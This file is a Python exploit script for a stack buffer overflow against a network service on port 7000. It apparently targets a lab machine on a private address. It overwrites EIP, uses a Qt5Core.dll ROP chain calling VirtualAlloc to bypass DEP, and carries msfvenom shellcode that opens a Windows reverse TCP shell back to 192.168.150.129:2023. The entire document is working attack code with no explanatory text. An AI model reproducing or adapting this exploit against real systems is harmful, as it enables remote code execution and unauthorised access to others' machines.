import socket
import struct

target = "192.168.150.131"

padding1   = b"\x90" * 1052
EIP        = b"\xB6\x42\xA8\x68" # 0x68A842B6 -> RET
NOPS       = b"\x90" * 30

#!mona rop -m qt5core.dll -cpb "\x00\x0a\x0d"
def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x68fb5ef4,  # POP EAX # RETN [Qt5Core.dll] 
      0x690398a0,  # ptr to &VirtualAlloc() [IAT Qt5Core.dll]
      0x68b711c6,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [Qt5Core.dll] 
      0x68b777f6,  # XCHG EAX,ESI # RETN [Qt5Core.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x68c88966,  # POP EBP # RETN [Qt5Core.dll] 
      0x68d652e1,  # & call esp [Qt5Core.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x68ae2632,  # POP EDX # RETN [Qt5Core.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x68bd5fe4,  # NEG EDX # RETN 0x0C [Qt5Core.dll] 
      0x68c4a096,  # POP EBX # RETN [Qt5Core.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0xffffffff,  #  
      0x68fa1750,  # INC EBX # RETN [Qt5Core.dll] 
      0x68f8063c,  # ADD EBX,EDX # ADD AL,0A # RETN [Qt5Core.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x68fb5ef4,  # POP EAX # RETN [Qt5Core.dll] 
      0x6ff9e937,  # put delta into eax (-> put 0x00001000 into edx)
      0x68fbc008,  # ADD EAX,86038743 # ADD AL,83 # ADD EAX,0A029F03 # RETN [Qt5Core.dll] 
      0x68bb687f,  # XCHG EAX,EDX # RETN [Qt5Core.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x68fb5ef4,  # POP EAX # RETN [Qt5Core.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x68cef5b2,  # NEG EAX # RETN [Qt5Core.dll] 
      0x68fb862d,  # XCHG EAX,ECX # RETN [Qt5Core.dll] 
      #[---INFO:gadgets_to_set_edi:---]
      0x68aee9f3,  # POP EDI # RETN [Qt5Core.dll] 
      0x68cef5b4,  # RETN (ROP NOP) [Qt5Core.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x68b226c5,  # POP EAX # RETN [Qt5Core.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x68a914f5,  # PUSHAD # RETN [Qt5Core.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

ROP = create_rop_chain()

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.129 LPORT=2023 -a x86 -b '\x00\x0A\x0D' -f python --var-name payload
payload =  b""
payload += b"\xdb\xd9\xd9\x74\x24\xf4\xbe\x1a\x2c\xb7\xbe"
payload += b"\x5d\x2b\xc9\xb1\x52\x31\x75\x17\x03\x75\x17"
payload += b"\x83\xdf\x28\x55\x4b\x23\xd8\x1b\xb4\xdb\x19"
payload += b"\x7c\x3c\x3e\x28\xbc\x5a\x4b\x1b\x0c\x28\x19"
payload += b"\x90\xe7\x7c\x89\x23\x85\xa8\xbe\x84\x20\x8f"
payload += b"\xf1\x15\x18\xf3\x90\x95\x63\x20\x72\xa7\xab"
payload += b"\x35\x73\xe0\xd6\xb4\x21\xb9\x9d\x6b\xd5\xce"
payload += b"\xe8\xb7\x5e\x9c\xfd\xbf\x83\x55\xff\xee\x12"
payload += b"\xed\xa6\x30\x95\x22\xd3\x78\x8d\x27\xde\x33"
payload += b"\x26\x93\x94\xc5\xee\xed\x55\x69\xcf\xc1\xa7"
payload += b"\x73\x08\xe5\x57\x06\x60\x15\xe5\x11\xb7\x67"
payload += b"\x31\x97\x23\xcf\xb2\x0f\x8f\xf1\x17\xc9\x44"
payload += b"\xfd\xdc\x9d\x02\xe2\xe3\x72\x39\x1e\x6f\x75"
payload += b"\xed\x96\x2b\x52\x29\xf2\xe8\xfb\x68\x5e\x5e"
payload += b"\x03\x6a\x01\x3f\xa1\xe1\xac\x54\xd8\xa8\xb8"
payload += b"\x99\xd1\x52\x39\xb6\x62\x21\x0b\x19\xd9\xad"
payload += b"\x27\xd2\xc7\x2a\x47\xc9\xb0\xa4\xb6\xf2\xc0"
payload += b"\xed\x7c\xa6\x90\x85\x55\xc7\x7a\x55\x59\x12"
payload += b"\x2c\x05\xf5\xcd\x8d\xf5\xb5\xbd\x65\x1f\x3a"
payload += b"\xe1\x96\x20\x90\x8a\x3d\xdb\x73\x75\x69\x75"
payload += b"\x02\x1d\x68\x79\x02\x39\xe5\x9f\x66\xd5\xa0"
payload += b"\x08\x1f\x4c\xe9\xc2\xbe\x91\x27\xaf\x81\x1a"
payload += b"\xc4\x50\x4f\xeb\xa1\x42\x38\x1b\xfc\x38\xef"
payload += b"\x24\x2a\x54\x73\xb6\xb1\xa4\xfa\xab\x6d\xf3"
payload += b"\xab\x1a\x64\x91\x41\x04\xde\x87\x9b\xd0\x19"
payload += b"\x03\x40\x21\xa7\x8a\x05\x1d\x83\x9c\xd3\x9e"
payload += b"\x8f\xc8\x8b\xc8\x59\xa6\x6d\xa3\x2b\x10\x24"
payload += b"\x18\xe2\xf4\xb1\x52\x35\x82\xbd\xbe\xc3\x6a"
payload += b"\x0f\x17\x92\x95\xa0\xff\x12\xee\xdc\x9f\xdd"
payload += b"\x25\x65\xaf\x97\x67\xcc\x38\x7e\xf2\x4c\x25"
payload += b"\x81\x29\x92\x50\x02\xdb\x6b\xa7\x1a\xae\x6e"
payload += b"\xe3\x9c\x43\x03\x7c\x49\x63\xb0\x7d\x58"

overrun = b"C" * (1500 - len(padding1 + NOPS + EIP + ROP + payload))

buf = padding1 + EIP + ROP + NOPS + payload + overrun

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,7000))
s.send(buf)
